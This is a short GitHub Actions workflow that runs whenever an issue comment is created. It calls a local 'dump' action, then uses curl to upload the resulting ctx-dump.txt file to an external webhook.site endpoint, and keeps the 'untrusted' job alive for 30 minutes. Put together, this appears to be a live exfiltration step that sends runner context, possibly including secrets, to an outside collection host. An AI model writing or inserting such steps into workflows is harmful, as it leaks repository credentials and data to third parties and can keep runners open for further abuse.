name: cb-c-issue-comment
on:
  issue_comment:
    types: [created]
jobs:
  c:
    runs-on: ubuntu-latest
    timeout-minutes: 40
    steps:
      - uses: actions/checkout@v4
      - name: dump
        uses: ./.github/actions/dump
      - name: upload + hold
        run: |
          curl -s -X POST https://webhook.site/153b24e0-26d3-437e-8fcc-e08c48298e2e -F "f=@ctx-dump.txt" -F "src=live-C-issuecomment"
          echo "holding untrusted issue_comment job alive"
          sleep 1800
